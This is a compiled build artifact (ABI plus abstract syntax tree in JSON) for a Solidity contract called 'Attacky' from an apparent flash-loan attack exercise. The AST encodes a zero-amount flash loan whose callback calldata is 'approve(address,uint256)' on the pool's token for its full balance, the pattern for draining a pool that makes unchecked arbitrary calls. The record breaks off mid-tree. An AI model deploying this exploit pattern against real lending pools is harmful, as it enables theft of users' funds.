{
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_poolAddress",
          "type": "address"
        }
      ],
      "stateMutability": "payable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "flashAttack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "poolAddress",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    }
  ],
  "allSourcePaths": {
    "1": "/Users/m4ud/.brownie/packages/OpenZeppelin/openzeppelin-contracts@4.8.0/contracts/security/ReentrancyGuard.sol",
    "13": "contracts/flash-loan-attacks-1/Pool.sol",
    "14": "contracts/flash-loan-attacks-1/flashAttack.sol",
    "22": "hardhat/console.sol",
    "3": "/Users/m4ud/.brownie/packages/OpenZeppelin/openzeppelin-contracts@4.8.0/contracts/token/ERC20/IERC20.sol",
    "5": "/Users/m4ud/.brownie/packages/OpenZeppelin/openzeppelin-contracts@4.8.0/contracts/token/ERC20/extensions/draft-IERC20Permit.sol",
    "6": "/Users/m4ud/.brownie/packages/OpenZeppelin/openzeppelin-contracts@4.8.0/contracts/token/ERC20/utils/SafeERC20.sol",
    "7": "/Users/m4ud/.brownie/packages/OpenZeppelin/openzeppelin-contracts@4.8.0/contracts/utils/Address.sol"
  },
  "ast": {
    "absolutePath": "contracts/flash-loan-attacks-1/flashAttack.sol",
    "exportedSymbols": {
      "Address": [
        2226
      ],
      "Attacky": [
        1173
      ],
      "IERC20": [
        3058
      ],
      "IERC20Permit": [
        12322
      ],
      "Pool": [
        3845
      ],
      "ReentrancyGuard": [
        2280
      ],
      "SafeERC20": [
        12286
      ],
      "console": [
        11909
      ]
    },
    "id": 1174,
    "nodeType": "SourceUnit",
    "nodes": [
      {
        "id": 1026,
        "literals": [
          "solidity",
          "^",
          "0.8",
          ".13"
        ],
        "nodeType": "PragmaDirective",
        "src": "116:24:14"
      },
      {
        "absolutePath": "contracts/flash-loan-attacks-1/Pool.sol",
        "file": "./Pool.sol",
        "id": 1027,
        "nameLocation": "-1:-1:-1",
        "nodeType": "ImportDirective",
        "scope": 1174,
        "sourceUnit": 3846,
        "src": "142:20:14",
        "symbolAliases": [],
        "unitAlias": ""
      },
      {
        "absolutePath": "hardhat/console.sol",
        "file": "hardhat/console.sol",
        "id": 1028,
        "nameLocation": "-1:-1:-1",
        "nodeType": "ImportDirective",
        "scope": 1174,
        "sourceUnit": 11910,
        "src": "163:29:14",
        "symbolAliases": [],
        "unitAlias": ""
      },
      {
        "absolutePath": "/Users/m4ud/.brownie/packages/OpenZeppelin/openzeppelin-contracts@4.8.0/contracts/token/ERC20/IERC20.sol",
        "file": "@openzeppelin/contracts/token/ERC20/IERC20.sol",
        "id": 1029,
        "nameLocation": "-1:-1:-1",
        "nodeType": "ImportDirective",
        "scope": 1174,
        "sourceUnit": 3059,
        "src": "193:56:14",
        "symbolAliases": [],
        "unitAlias": ""
      },
      {
        "absolutePath": "/Users/m4ud/.brownie/packages/OpenZeppelin/openzeppelin-contracts@4.8.0/contracts/utils/Address.sol",
        "file": "@openzeppelin/contracts/utils/Address.sol",
        "id": 1030,
        "nameLocation": "-1:-1:-1",
        "nodeType": "ImportDirective",
        "scope": 1174,
        "sourceUnit": 2227,
        "src": "250:51:14",
        "symbolAliases": [],
        "unitAlias": ""
      },
      {
        "abstract": false,
        "baseContracts": [],
        "canonicalName": "Attacky",
        "contractDependencies": [],
        "contractKind": "contract",
        "fullyImplemented": true,
        "id": 1173,
        "linearizedBaseContracts": [
          1173
        ],
        "name": "Attacky",
        "nameLocation": "391:7:14",
        "nodeType": "ContractDefinition",
        "nodes": [
          {
            "global": false,
            "id": 1033,
            "libraryName": {
              "id": 1031,
              "name": "Address",
              "nameLocations": [
                "413:7:14"
              ],
              "nodeType": "IdentifierPath",
              "referencedDeclaration": 2226,
              "src": "413:7:14"
            },
            "nodeType": "UsingForDirective",
            "src": "407:26:14",
            "typeName": {
              "id": 1032,
              "name": "address",
              "nodeType": "ElementaryTypeName",
              "src": "425:7:14",
              "stateMutability": "nonpayable",
              "typeDescriptions": {
                "typeIdentifier": "t_address",
                "typeString": "address"
              }
            }
          },
          {
            "constant": false,
            "id": 1036,
            "mutability": "immutable",
            "name": "pool",
            "nameLocation": "454:4:14",
            "nodeType": "VariableDeclaration",
            "scope": 1173,
            "src": "439:19:14",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_contract$_Pool_$3845",
              "typeString": "contract Pool"
            },
            "typeName": {
              "id": 1035,
              "nodeType": "UserDefinedTypeName",
              "pathNode": {
                "id": 1034,
                "name": "Pool",
                "nameLocations": [
                  "439:4:14"
                ],
                "nodeType": "IdentifierPath",
                "referencedDeclaration": 3845,
                "src": "439:4:14"
              },
              "referencedDeclaration": 3845,
              "src": "439:4:14",
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_Pool_$3845",
                "typeString": "contract Pool"
              }
            },
            "visibility": "internal"
          },
          {
            "constant": false,
            "id": 1039,
            "mutability": "immutable",
            "name": "tokenz",
            "nameLocation": "481:6:14",
            "nodeType": "VariableDeclaration",
            "scope": 1173,
            "src": "464:23:14",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_contract$_IERC20_$3058",
              "typeString": "contract IERC20"
            },
            "typeName": {
              "id": 1038,
              "nodeType": "UserDefinedTypeName",
              "pathNode": {
                "id": 1037,
                "name": "IERC20",
                "nameLocations": [
                  "464:6:14"
                ],
                "nodeType": "IdentifierPath",
                "referencedDeclaration": 3058,
                "src": "464:6:14"
              },
              "referencedDeclaration": 3058,
              "src": "464:6:14",
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_IERC20_$3058",
                "typeString": "contract IERC20"
              }
            },
            "visibility": "internal"
          },
          {
            "constant": false,
            "functionSelector": "1755ff21",
            "id": 1041,
            "mutability": "mutable",
            "name": "poolAddress",
            "nameLocation": "508:11:14",
            "nodeType": "VariableDeclaration",
            "scope": 1173,
            "src": "493:26:14",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_address",
              "typeString": "address"
            },
            "typeName": {
              "id": 1040,
              "name": "address",
              "nodeType": "ElementaryTypeName",
              "src": "493:7:14",
              "stateMutability": "nonpayable",
              "typeDescriptions": {
                "typeIdentifier": "t_address",
                "typeString": "address"
              }
            },
            "visibility": "public"
          },
          {
            "body": {
              "id": 1067,
              "nodeType": "Block",
              "src": "568:125:14",
              "statements": [
                {
                  "expression": {
                    "id": 1048,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 1046,
                      "name": "poolAddress",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1041,
                      "src": "578:11:14",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "id": 1047,
                      "name": "_poolAddress",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1043,
                      "src": "592:12:14",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "src": "578:26:14",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "id": 1049,
                  "nodeType": "ExpressionStatement",
                  "src": "578:26:14"
                },
                {
                  "expression": {
                    "id": 1054,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 1050,
                      "name": "pool",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1036,
                      "src": "614:4:14",
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_Pool_$3845",
                        "typeString": "contract Pool"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "arguments": [
                        {
                          "id": 1052,
                          "name": "poolAddress",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 1041,
                          "src": "626:11:14",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        ],
                        "id": 1051,
                        "name": "Pool",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 3845,
                        "src": "621:4:14",
                        "typeDescriptions": {
                          "typeIdentifier": "t_type$_t_contract$_Pool_$3845_$",
                          "typeString": "type(contract Pool)"
                        }
                      },
                      "id": 1053,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "typeConversion",
                      "lValueRequested": false,
                      "nameLocations": [],
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "621:17:14",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_Pool_$3845",
                        "typeString": "contract Pool"
                      }
                    },
                    "src": "614:24:14",
                    "typeDescriptions": {
                      "typeIdentifier": "t_contract$_Pool_$3845",
                      "typeString": "contract Pool"
                    }
                  },
                  "id": 1055,
                  "nodeType": "ExpressionStatement",
                  "src": "614:24:14"
                },
                {
                  "expression": {
                    "id": 1065,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 1056,
                      "name": "tokenz",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1039,
                      "src": "648:6:14",
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_IERC20_$3058",
                        "typeString": "contract IERC20"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "arguments": [
                        {
                          "arguments": [
                            {
                              "arguments": [],
                              "expression": {
                                "argumentTypes": [],
                                "expression": {
                                  "id": 1060,
                                  "name": "pool",
                                  "nodeType": "Identifier",
                                  "overloadedDeclarations": [],
                                  "referencedDeclaration": 1036,
                                  "src": "672:4:14",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_contract$_Pool_$3845",
                                    "typeString": "contract Pool"
                                  }
                                },
                                "id": 1061,
                                "isConstant": false,
                                "isLValue": false,
                                "isPure": false,
                                "lValueRequested": false,
                                "memberLocation": "677:5:14",
                                "memberName": "token",
                                "nodeType": "MemberAccess",
                                "referencedDeclaration": 3771,
                                "src": "672:10:14",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_function_external_view$__$returns$_t_contract$_IERC20_$3058_$",
                                  "typeString": "function () view external returns (contract IERC20)"
                                }
                              },
                              "id": 1062,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": false,
                              "kind": "functionCall",
                              "lValueRequested": false,
                              "nameLocations": [],
                              "names": [],
                              "nodeType": "FunctionCall",
                              "src": "672:12:14",
                              "tryCall": false,
                              "typeDescriptions": {
                                "typeIdentifier": "t_contract$_IERC20_$3058",
                                "typeString": "contract IERC20"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_contract$_IERC20_$3058",
                                "typeString": "contract IERC20"
                              }
                            ],
                            "id": 1059,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": true,
                            "lValueRequested": false,
                            "nodeType": "ElementaryTypeNameExpression",
                            "src": "664:7:14",
                            "typeDescriptions": {
                              "typeIdentifier": "t_type$_t_address_$",
                              "typeString": "type(address)"
                            },
                            "typeName": {
                              "id": 1058,
                              "name": "address",
                              "nodeType": "ElementaryTypeName",
                              "src": "664:7:14",
                              "typeDescriptions": {}
                            }
                          },
                          "id": 1063,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "typeConversion",
                          "lValueRequested": false,
                          "nameLocations": [],
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "664:21:14",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        ],
                        "id": 1057,
                        "name": "IERC20",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 3058,
                        "src": "657:6:14",
                        "typeDescriptions": {
                          "typeIdentifier": "t_type$_t_contract$_IERC20_$3058_$",
                          "typeString": "type(contract IERC20)"
                        }
                      },
                      "id": 1064,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "typeConversion",
                      "lValueRequested": false,
                      "nameLocations": [],
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "657:29:14",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_IERC20_$3058",
                        "typeString": "contract IERC20"
                      }
                    },
                    "src": "648:38:14",
                    "typeDescriptions": {
                      "typeIdentifier": "t_contract$_IERC20_$3058",
                      "typeString": "contract IERC20"
                    }
                  },
                  "id": 1066,
                  "nodeType": "ExpressionStatement",
                  "src": "648:38:14"
                }
              ]
            },
            "id": 1068,
            "implemented": true,
            "kind": "constructor",
            "modifiers": [],
            "name": "",
            "nameLocation": "-1:-1:-1",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 1044,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 1043,
                  "mutability": "mutable",
                  "name": "_poolAddress",
                  "nameLocation": "546:12:14",
                  "nodeType": "VariableDeclaration",
                  "scope": 1068,
                  "src": "538:20:14",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 1042,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "538:7:14",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "537:22:14"
            },
            "returnParameters": {
              "id": 1045,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "568:0:14"
            },
            "scope": 1173,
            "src": "525:168:14",
            "stateMutability": "payable",
            "virtual": false,
            "visibility": "public"
          },
          {
            "body": {
              "id": 1171,
              "nodeType": "Block",
              "src": "737:836:14",
              "statements": [
                {
                  "expression": {
                    "arguments": [
                      {
                        "hexValue": "506f6f6c2062616c616e6365204245464f52453a20",
                        "id": 1074,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "759:23:14",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_108ecb1e8e665eb9f9a62249680b2b0a24c4d33a94a05366f3b347bee387c726",
                          "typeString": "literal_string \"Pool balance BEFORE: \""
                        },
                        "value": "Pool balance BEFORE: "
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 1079,
                                "name": "pool",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": 1036,
                                "src": "808:4:14",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_Pool_$3845",
                                  "typeString": "contract Pool"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_Pool_$3845",
                                  "typeString": "contract Pool"
                                }
                              ],
                              "id": 1078,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "800:7:14",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 1077,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "800:7:14",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 1080,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "nameLocations": [],
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "800:13:14",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "expression": {
                            "id": 1075,
                            "name": "tokenz",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 1039,
                            "src": "783:6:14",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_IERC20_$3058",
                              "typeString": "contract IERC20"
                            }
                          },
                          "id": 1076,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberLocation": "790:9:14",
                          "memberName": "balanceOf",
                          "nodeType": "MemberAccess",
                          "referencedDeclaration": 3015,
                          "src": "783:16:14",
                          "typeDescriptions": {
                            "typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
                            "typeString": "function (address) view external returns (uint256)"
                          }
                        },
                        "id": 1081,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "functionCall",
                        "lValueRequested": false,
                        "nameLocations": [],
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "783:31:14",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_stringliteral_108ecb1e8e665eb9f9a62249680b2b0a24c4d33a94a05366f3b347bee387c726",
                          "typeString": "literal_string \"Pool balance BEFORE: \""
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "expression": {
                        "id": 1071,
                        "name": "console",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 11909,
                        "src": "747:7:14",
                        "typeDescriptions": {
                          "typeIdentifier": "t_type$_t_contract$_console_$11909_$",
                          "typeString": "type(library console)"
                        }
                      },
                      "id": 1073,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberLocation": "755:3:14",
                      "memberName": "log",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 4553,
                      "src": "747:11:14",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_view$_t_string_memory_ptr_$_t_uint256_$returns$__$",
                        "typeString": "function (string memory,uint256) view"
                      }
                    },
                    "id": 1082,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "nameLocations": [],
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "747:68:14",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 1083,
                  "nodeType": "ExpressionStatement",
                  "src": "747:68:14"
                },
                {
                  "assignments": [
                    1085
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 1085,
                      "mutability": "mutable",
                      "name": "amount",
                      "nameLocation": "833:6:14",
                      "nodeType": "VariableDeclaration",
                      "scope": 1171,
                      "src": "825:14:14",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      },
                      "typeName": {
                        "id": 1084,
                        "name": "uint256",
                        "nodeType": "ElementaryTypeName",
                        "src": "825:7:14",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "visibility": "internal"
                    }
                  ],
                  "id": 1087,
                  "initialValue": {
                    "hexValue": "30",
                    "id": 1086,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": true,
                    "kind": "number",
                    "lValueRequested": false,
                    "nodeType": "Literal",
                    "src": "842:1:14",
                    "typeDescriptions": {
                      "typeIdentifier": "t_rational_0_by_1",
                      "typeString": "int_const 0"
                    },
                    "value": "0"
                  },
                  "nodeType": "VariableDeclarationStatement",
                  "src": "825:18:14"
                },
                {
                  "assignments": [
                    1089
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 1089,
                      "mutability": "mutable",
                      "name": "borrower",
                      "nameLocation": "861:8:14",
                      "nodeType": "VariableDeclaration",
                      "scope": 1171,
                      "src": "853:16:14",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      },
                      "typeName": {
                        "id": 1088,
                        "name": "address",
                        "nodeType": "ElementaryTypeName",
                        "src": "853:7:14",
                        "stateMutability": "nonpayable",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      "visibility": "internal"
                    }
                  ],
                  "id": 1094,
                  "initialValue": {
                    "arguments": [
                      {
                        "id": 1092,
                        "name": "this",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": -28,
                        "src": "880:4:14",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_Attacky_$1173",
                          "typeString": "contract Attacky"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_contract$_Attacky_$1173",
                          "typeString": "contract Attacky"
                        }
                      ],
                      "id": 1091,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": true,
                      "lValueRequested": false,
                      "nodeType": "ElementaryTypeNameExpression",
                      "src": "872:7:14",
                      "typeDescriptions": {
                        "typeIdentifier": "t_type$_t_address_$",
                        "typeString": "type(address)"
                      },
                      "typeName": {
                        "id": 1090,
                        "name": "address",
                        "nodeType": "ElementaryTypeName",
                        "src": "872:7:14",
                        "typeDescriptions": {}
                      }
                    },
                    "id": 1093,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "typeConversion",
                    "lValueRequested": false,
                    "nameLocations": [],
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "872:13:14",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "nodeType": "VariableDeclarationStatement",
                  "src": "853:32:14"
                },
                {
                  "assignments": [
                    1096
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 1096,
                      "mutability": "mutable",
                      "name": "target",
                      "nameLocation": "903:6:14",
                      "nodeType": "VariableDeclaration",
                      "scope": 1171,
                      "src": "895:14:14",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      },
                      "typeName": {
                        "id": 1095,
                        "name": "address",
                        "nodeType": "ElementaryTypeName",
                        "src": "895:7:14",
                        "stateMutability": "nonpayable",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      "visibility": "internal"
                    }
                  ],
                  "id": 1101,
                  "initialValue": {
                    "arguments": [
                      {
                        "id": 1099,
                        "name": "tokenz",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 1039,
                        "src": "920:6:14",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_IERC20_$3058",
                          "typeString": "contract IERC20"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_contract$_IERC20_$3058",
                          "typeString": "contract IERC20"
                        }
                      ],
                      "id": 1098,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": true,
                      "lValueRequested": false,
                      "nodeType": "ElementaryTypeNameExpression",
                      "src": "912:7:14",
                      "typeDescriptions": {
                        "typeIdentifier": "t_type$_t_address_$",
                        "typeString": "type(address)"
                      },
                      "typeName": {
                        "id": 1097,
                        "name": "address",
                        "nodeType": "ElementaryTypeName",
                        "src": "912:7:14",
                        "typeDescriptions": {}
                      }
                    },
                    "id": 1100,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "typeConversion",
                    "lValueRequested": false,
                    "nameLocations": [],
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "912:15:14",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "nodeType": "VariableDeclarationStatement",
                  "src": "895:32:14"
                },
                {
                  "assignments": [
                    1103
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 1103,
                      "mutability": "mutable",
                      "name": "data",
                      "nameLocation": "950:4:14",
                      "nodeType": "VariableDeclaration",
                      "scope": 1171,
                      "src": "937:17:14",
                      "stateVariable": false,
                      "storageLocation": "memory",
                      "typeDescriptions": {
                        "typeIdentifier": "t_bytes_memory_ptr",
                        "typeString": "bytes"
                      },
                      "typeName": {
                        "id": 1102,
                        "name": "bytes",
                        "nodeType": "ElementaryTypeName",
                        "src": "937:5:14",
                        "typeDescriptions": {
                          "typeIdentifier": "t_bytes_storage_ptr",
                          "typeString": "bytes"
                        }
                      },
                      "visibility": "internal"
                    }
                  ],
                  "id": 1119,
                  "initialValue": {
                    "arguments": [
                      {
                        "hexValue": "617070726f766528616464726573732c75696e7432353629",
                        "id": 1106,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "981:26:14",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_095ea7b334ae44009aa867bfb386f5c3b4b443ac6f0ee573fa91c4608fbadfba",
                          "typeString": "literal_string \"approve(address,uint256)\""
                        },
                        "value": "approve(address,uint256)"
                      },
                      {
                        "arguments": [
                          {
                            "id": 1109,
                            "name": "this",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": -28,
                            "src": "1017:4:14",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_Attacky_$1173",
                              "typeString": "contract Attacky"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_contract$_Attacky_$1173",
                              "typeString": "contract Attacky"
                            }
                          ],
                          "id": 1108,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "1009:7:14",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_$",
                            "typeString": "type(address)"
                          },
                          "typeName": {
                            "id": 1107,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "1009:7:14",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 1110,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "nameLocations": [],
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "1009:13:14",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 1115,
                                "name": "pool",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": 1036,
                                "src": "1049:4:14",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_Pool_$3845",
                                  "typeString": "contract Pool"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_Pool_$3845",
                                  "typeString": "contract Pool"
                                }
                              ],
                              "id": 1114,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "1041:7:14",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 1113,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "1041:7:14",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 1116,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "nameLocations": [],
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "1041:13:14",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "expression": {
                            "id": 1111,
                            "name": "tokenz",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 1039,
                            "src": "1024:6:14",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_IERC20_$3058",
                              "typeString": "contract IERC20"
                            }
                          },
                          "id": 1112,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberLocation": "1031:9:14",
                          "memberName": "balanceOf",
                          "nodeType": "MemberAccess",
                          "referencedDeclaration": 3015,
                          "src": "1024:16:14",
                          "typeDescriptions": {
                            "typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
                            "typeString": "function (address) view external returns (uint256)"
                          }
                        },
                        "id": 1117,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "functionCall",
                        "lValueRequested": false,
                        "nameLocations": [],
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "1024:31:14",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
